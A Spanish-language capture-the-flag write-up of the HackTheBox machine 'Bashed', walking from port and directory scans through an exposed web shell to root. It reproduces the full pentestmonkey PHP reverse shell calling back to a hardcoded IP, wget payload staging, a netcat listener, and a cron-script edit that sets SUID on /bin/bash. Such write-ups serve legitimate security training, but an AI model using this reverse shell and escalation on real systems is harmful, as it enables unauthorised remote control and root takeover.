---
date: 2023-05-06 12:00:00
layout: post
title: Bashed Writeup
subtitle: Writeup de la máquina Bashed de la plataforma HackTheBox
description: Realizaré la máquina Bashed explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Easy.
image: https://miro.medium.com/max/586/1*2mXiaBfDCP6jPMcMpxUG8Q.png
optimized_image: https://miro.medium.com/max/586/1*2mXiaBfDCP6jPMcMpxUG8Q.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Linux
author: FredBrave
---
# Enumeración
Empezamos con un escaneo rapido a los puertos de la maquina. Una vez descubiertos estos puertos intentaremos un escaneo exhaustivo hacia los puertos abiertos, esto es para agilizar el escaneo lo mas rapido posible.
```bash
$ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.191.29 -oG Targeted  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 11:27 EDT
Nmap scan report for 10.129.191.29
Host is up (0.25s latency).
Not shown: 65303 closed tcp ports (reset), 231 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 41.48 seconds

$ sudo nmap -p80 -sCV 10.129.191.29 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 11:28 EDT
Nmap scan report for 10.129.191.29
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.38 seconds
```
Con esto identificamos el puerto 80 abierto ademas de la version de su servicio.
Revisaremos la web para tratar de encontrar algo de valor
<img class="img" src="/assets/img/machines/Bashed/1.png" width="1000">
La web contiene una breve opinion sobre una herramienta llamada phpbash, ademas del interesante mensaje de que lo desarrollo en este server...

Trate de encontrar mas, pero solo encontre un link a <a href='https://github.com/Arrexel/phpbash'>github</a> sobre la herramienta en si.
Como no encontraba nada mas intente hacer un fuzz rapido con ffuf.
```bash
ffuf -u http://10.129.191.29/FUZZ -w /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.191.29/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 3891ms]
    * FUZZ: images

[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 172ms]
    * FUZZ: uploads

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 352ms]
    * FUZZ: php

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 164ms]
    * FUZZ: css

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 166ms]
    * FUZZ: dev

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 172ms]
    * FUZZ: js

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 227ms]
    * FUZZ: config.php

[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 223ms]
    * FUZZ: fonts

[Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 171ms]
    * FUZZ: .php

[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 202ms]
    * FUZZ: 

[Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 216ms]
    * FUZZ: server-status
```
Entre estos los mas interesantes son uploads y dev.
Revisando la ruta dev me encontre con esto.
<img class="img" src="/assets/img/machines/Bashed/2.png" width="800">
Al entrar a phpbash.php parece que ingresaramos a una web shell.
<img class="img" src="/assets/img/machines/Bashed/3.png" width="800">
Con esto tenemos ejecucion remota de comandos como www-data.
# shell como scriptmanager
Intente varios tipos de reverse shell para obtener una en mi maquina, pero ninguna funcionaba al final solo intente enumerar la maquina haber si conseguia algo interesante.
Revise los usuarios en el /etc/passwd parecen haber 2 mas ademas de root.
```bash
www-data@bashed
:/var/www/html/dev# cat /etc/passwd | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```
al hacer un sudo -l me doy cuenta de que puedo realizar cualquier comando como scriptmanager. Intente obtener una bash como script manager, pero no me la dejo obtener.
```bash
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed
:/var/www/html/dev# sudo -u 'scriptmanager' bash

www-data@bashed
:/var/www/html/dev# whoami

www-data
```
Al no encontrar ninguna cosa mas intersante intente subir archivos en el /var/www/html.
```bash
www-data@bashed
:/var/www/html/uploads# ls

index.html
www-data@bashed
:/var/www/html/uploads# touch hola

www-data@bashed
:/var/www/html/uploads# ls

hola
index.html
```
Me dejo subir cosas por lo que ya tenia una idea de que subir. Intente subir el tipico archivo php de pentest monkey que nos envia una shell a nuestra maquina.
```bash
cat reverse.php 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.42';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.191.29 - - [06/May/2023 12:11:59] "GET /reverse.php HTTP/1.1" 200 -

www-data@bashed
:/var/www/html/uploads# wget http://10.10.16.42/reverse.php

--2023-05-06 09:13:11-- http://10.10.16.42/reverse.php
Connecting to 10.10.16.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5492 (5.4K) [application/octet-stream]
Saving to: 'reverse.php'

0K ..... 100% 336M=0s

2023-05-06 09:13:12 (336 MB/s) - 'reverse.php' saved [5492/5492]
```
Entonces solo hice un curl hacia la ruta en cuestion y deberia de llegarme una shell en mi puerto de escucha.
```bash
$ curl http://10.129.191.29/uploads/reverse.php

$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.191.29] 41242
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:15:25 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
Una vez hecho esto hice un tratamiento de la tty rapido y ya por ultimo intente ejecutar una bash como scriptmanager.
```bash
www-data@bashed:/$ sudo -u scriptmanager bash
scriptmanager@bashed:/$ whoami
scriptmanager
```
# Shell como root
En la raiz encontre una carpeta en donde el propietario era scriptmanager.
```bash
scriptmanager@bashed:/$ ls -la
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            212 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 May  6 08:20 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 179 root          root              0 May  6 08:20 proc
drwx------   3 root          root           4096 May  6 08:21 root
drwxr-xr-x  18 root          root            520 May  6 08:20 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 May  6 08:20 sys
drwxrwxrwt  10 root          root           4096 May  6 09:22 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```
Revisandola encontre un script en python perteneciente a scriptmanager y un archivo de texto perteneciente a root.
```bash
scriptmanager@bashed:/$ cd scripts/
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May  6 09:24 test.txt
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
testing 123!
scriptmanager@bashed:/scripts$
```
Analizandolos puedo suponer que el usuario root ejecuto el script en python y viendo la creacion del archivo test.txt pude suponer que hay un cron job que ejecuta el archivo cada poco tiempo.
Entonces solo cambie el contenido del archivo test.py por este.
```bash
scriptmanager@bashed:/scripts$ nano test.py
scriptmanager@bashed:/scripts$ cat test.py
import os
os.system('chmod +s /bin/bash')
scriptmanager@bashed:/scripts$
```
Entonces pasado el tiempo revise /bin/bash y tenia el permiso s.
```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
bash-4.3#
```
Hemos pwneado la maquina!!!
